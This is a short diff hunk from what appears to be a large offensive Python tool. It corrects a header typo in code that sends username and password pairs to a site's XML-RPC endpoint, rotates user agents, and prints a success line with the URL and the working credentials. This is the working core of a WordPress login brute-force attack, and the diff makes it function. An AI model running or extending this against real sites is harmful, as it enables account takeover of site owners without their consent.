@@ -5565,7 +5565,7 @@ elif answer == ("20"):
                             </methodCall>
                             """.format(username, password)
                             try:
-                                headers = {"User-Agent": random.choice(user_agents), "Contect-Type": "application/json"}
+                                headers = {"User-Agent": random.choice(user_agents), "Content-Type": "application/json"}
                                 response = requests.post(url, headers=headers, data=xml_payload, timeout=7)
                                 if 'blogName' in response.text:
                                     print(Fore.GREEN + '[ Success ] : {}#{}@{}'.format(url, username, password))
